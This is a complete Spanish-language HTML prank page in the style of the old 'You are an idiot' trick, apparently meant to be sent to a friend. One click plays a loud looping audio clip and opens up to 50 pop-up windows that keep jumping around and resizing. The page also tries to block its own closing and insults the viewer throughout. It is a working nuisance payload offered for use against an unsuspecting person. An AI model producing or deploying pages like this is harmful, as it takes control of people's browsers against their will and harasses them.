<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>¡SORPRESA ÉPICA! 😈</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #000;
      color: #0f0;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    h1 {
      font-size: 90px;
      color: #ff0000;
      text-shadow: 0 0 30px #fff;
      animation: blink 0.6s infinite alternate;
    }
    button {
      padding: 30px 100px;
      font-size: 50px;
      background: #ff0000;
      color: white;
      border: 8px solid #00ff00;
      border-radius: 30px;
      cursor: pointer;
      margin: 60px;
      box-shadow: 0 0 50px #0f0;
      transition: all 0.4s;
    }
    button:hover {
      transform: scale(1.2) rotate(10deg);
      background: #00ff00;
      color: #000;
    }
    @keyframes blink {
      from { opacity: 0.5; }
      to   { opacity: 1; }
    }
  </style>
</head>
<body>

<h1>¿LISTO PARA EL CAOS?</h1>
<button id="startBtn">CLIC AQUÍ SI ERES VALIENTE... O IDIOTA</button>

<audio id="idiotAudio" loop>
  <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
  Tu navegador no soporta audio.
</audio>

<script>
const audio = document.getElementById('idiotAudio');
const button = document.getElementById('startBtn');
let windowsOpened = 0;
const MAX_WINDOWS = 50;

function openChaosWindow() {
  if (windowsOpened >= MAX_WINDOWS) return;

  const w = window.open('', '_blank', 'width=450,height=350,menubar=no,toolbar=no,location=no,status=no');
  if (!w) {
    alert("¡Activa pop-ups o no verás la gracia, IDIOTA!");
    return;
  }

  windowsOpened++;

  w.document.write(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>YOU ARE AN IDIOT!!!</title>
      <style>
        body { margin:0; background:#000 url('https://i.imgur.com/8zKxX.gif') repeat; color:#0f0; font-family:Arial; overflow:hidden; text-align:center; }
        h1 { font-size:80px; margin-top:20vh; color:#ff0000; animation:blink 0.7s infinite; text-shadow:0 0 20px #fff; }
        @keyframes blink { 50% { opacity:0.4; } }
      </style>
    </head>
    <body>
      <h1>YOU ARE AN<br>IDIOT!!!</h1>
      <script>
        function chaosMove() {
          try {
            let x = Math.random() * (screen.width - 450);
            let y = Math.random() * (screen.height - 350);
            window.moveTo(x, y);
            window.resizeTo(450 + Math.random()*100, 350 + Math.random()*100);
          } catch(e) {}
        }
        setInterval(chaosMove, 300);
      <\/script>
    </body>
    </html>
  `);
  w.document.close();
}

// Al clic: ¡TODO EL CAOS!
button.onclick = function() {
  this.innerText = "¡YA NO HAY VUELTA ATRÁS!";
  this.disabled = true;
  this.style.background = "#00ff00";
  this.style.color = "#000";

  // Música a tope desde YA
  audio.volume = 1.0; // máximo volumen
  audio.play().catch(e => console.log("Audio bloqueado, clic extra en página"));

  // Abre las 50 ventanas con delay para que no bloquee todo de golpe
  let delay = 200;
  for (let i = 0; i < MAX_WINDOWS; i++) {
    setTimeout(() => {
      openChaosWindow();
    }, delay * i + Math.random() * 300);
  }

  // Mensaje final en la página principal después de un rato
  setTimeout(() => {
    document.body.innerHTML = `
      <h1 style="font-size:120px; color:#00ff00; margin-top:20vh;">¡50 VECES IDIOTA! 😂😂😂</h1>
      <p style="font-size:60px; color:white;">Broma épica completada, crack 😈<br>Te quiere tu amigo de Barranquilla</p>
    `;
  }, 15000); // 15 segundos después
};

// Para intentar más volumen o loop infinito si quieres (comenta si no)
audio.addEventListener('ended', () => audio.play());

// Bloqueo troll de cierre (opcional, pero divertido)
window.onbeforeunload = function() {
  return "¡No cierres, IDIOTA! ¡Aún no termina la diversión!";
};

</script>

</body>
</html>
